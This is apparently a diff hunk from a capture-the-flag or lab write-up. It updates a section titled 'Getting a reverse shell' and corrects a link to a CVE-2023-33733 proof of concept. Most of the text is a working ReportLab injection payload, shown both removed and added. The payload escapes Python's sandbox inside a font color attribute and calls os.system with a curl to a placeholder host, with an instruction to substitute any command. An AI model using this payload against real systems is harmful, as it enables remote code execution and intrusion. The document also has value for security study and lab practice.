@@ -102,13 +102,13 @@ While testing each field in the profile, it seems that the Bio changes `<script>
 
 ### 2.2. Getting a reverse shell
 
-Some searching shows that this (https://github.com/c53elyas/CVE-2023-337330 may be the vulnerability 
+Some searching shows that this (https://github.com/c53elyas/CVE-2023-33733) may be the vulnerability 
 
 PoC code, replace `curl http://xxx.xxx.xxx.xxx/` with the code to be executed
 
 ```xml
 <para>
-  <font color="[ [ getattr(pow,Word('__globals__'))['os'].system('curl http://xxx.xxx.xxx.xxx/') for Word in [orgTypeFun('Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: False, '__eq__': lambda self,x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: {setattr(self, 'mutated', self.mutated - 1)}, '__hash__': lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and 'red'">
+  <font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl http://xxx.xxx.xxx.xxx/') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
     exploit
   </font>
 </para>
